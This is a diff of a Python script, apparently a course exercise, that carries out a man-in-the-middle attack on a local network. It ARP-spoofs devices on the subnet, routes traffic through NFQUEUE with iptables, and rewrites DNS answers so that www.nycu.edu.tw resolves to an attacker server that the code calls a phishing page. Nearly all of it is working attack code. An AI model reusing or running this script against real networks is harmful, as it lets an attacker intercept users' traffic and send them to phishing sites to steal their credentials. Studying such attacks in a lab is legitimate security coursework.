@@ -1,31 +1,31 @@
 #!/usr/bin/env python3
 
 import mitm_attack as mitm
-from mitm_attack import COLOR, AP_IP, cmd
+from mitm_attack import cmd
 from scapy.all import *
 from netfilterqueue import NetfilterQueue
 
 QUEUENUM = 0
 TARGET_DOMAIN_NAME = b'www.nycu.edu.tw.'
 ATTACKER_SERVER = '140.113.207.237'
+# collect basic information
+HOST_IP = get_if_addr(conf.iface)  # default interface
+HOST_MAC = get_if_hwaddr(conf.iface) # default interface
+GW_IP = conf.route.route("0.0.0.0")[2] # gateway
+SUBNET = GW_IP + '/24'
 
 def dns_spoof_reply(packet):
-    """Spoof DNS response packet
-
-    Modify the answer field to Attack server IP
-    
-    :param packet: scapy packet
-    """
-    # create DNS response with attacker server as answer
-    dnsan = DNSRR(rrname=packet[DNS][DNSQR].qname, rdata=ATTACKER_SERVER)
-    dns = DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd, an=dnsan, ancount=1)
+    """Spoof DNS response packet"""
     # update DNS layer
-    packet[DNS] = dns
+    packet[DNS].an = DNSRR(rrname=packet[DNSQR].qname, rdata=ATTACKER_SERVER)
+    packet[DNS].ancount = 1
     # delete checksum and  length (since modified), scapy will recalculate them
-    del packet[IP].len
-    del packet[IP].chksum
-    del packet[UDP].len
-    del packet[UDP].chksum
+    if packet.haslayer(IP):
+        del packet[IP].len
+        del packet[IP].chksum
+    if packet.haslayer(UDP):
+        del packet[UDP].len
+        del packet[UDP].chksum
 
     return packet
 
@@ -39,10 +39,12 @@ def queue_callback(pkt):
     """
     # convert netfilter queue packet into scapy packet
     packet = IP(pkt.get_payload())
-
+    #print('packet in:', packet.summary())
     # check layers
-    if packet.haslayer(UDP) and packet.haslayer(DNS) and packet.haslayer(DNSRR):
-        if packet[DNS][DNSQR].qname == TARGET_DOMAIN_NAME:
+    #if packet.haslayer(UDP) and packet.haslayer(DNS) and packet.haslayer(DNSRR):
+    if packet.haslayer(DNSRR):
+        if TARGET_DOMAIN_NAME in packet[DNSQR].qname:
+            print("[*] Redirecting NYCU to 140.113.207.237")
             # print original packet
             print('original:', packet.summary())
             # spoof dns reply packet
@@ -60,21 +62,23 @@ def dns_spoofing():
     Redirect NYCU home page (www.nycu.edu.tw) to phishing page (140.113.207.237).
     """
     # set iptable rule on forwarding
+    cmd('sysctl -w net.ipv4.ip_forward=1')
+    cmd(f'iptables -I OUTPUT -j NFQUEUE --queue-num {QUEUENUM}')
+    cmd(f'iptables -I INPUT -j NFQUEUE --queue-num {QUEUENUM}')
     cmd(f'iptables -I FORWARD -j NFQUEUE --queue-num {QUEUENUM}')
 
     # filtering and redirecting packets
     queue = NetfilterQueue()
     try:
-        print()
-        print(COLOR.YELLOW + 'Start DNS spoofing.' + COLOR.RESET)
-        print(COLOR.VIOLET + 'To stop DNS spoofing, press ctrl+c.' + COLOR.RESET)
+        print('[+] Start DNS spoofing')
+        print('[*] To stop DNS spoofing, press ctrl+c')
         # bind the queue number (0) to the callback function and start it
         queue.bind(QUEUENUM, queue_callback)
         queue.run()
     except KeyboardInterrupt:
         # remove the rules
         cmd("iptables --flush")
-        print(COLOR.RED + 'Stop DNS spoofing.' + COLOR.RESET)
+        print('[+] Stop DNS spoofing')
         return
 
 def main():
@@ -84,12 +88,15 @@ def main():
     2. ARP spoofing
     3. DNS spoofing
     """
+    print('[+] Basic information')
+    print(f'Host\t{HOST_IP}\t{HOST_MAC}')
+    print(f'Gateway\t{GW_IP}')
+    print(f'Subnet\t{SUBNET}')
+
     # get available devices information
-    inf, ip_mac_dict = mitm.scan_ip_mac()
+    ip_mac_dict = mitm.scan_ip_mac(GW_IP, SUBNET)
     # Send spoofed ARP packets to all devices first (to become a middle man)
-    mitm.arp_spoofing_by_all(inf, ip_mac_dict, ATTACKER_SERVER)
-    ip_mac_dict[ATTACKER_SERVER] = 'none' # server to AP
-    mitm.arp_spoofing_by_all(inf, ip_mac_dict, AP_IP)
+    mitm.arp_spoofing(ip_mac_dict, HOST_MAC, GW_IP)
     # task 4
     dns_spoofing()
 
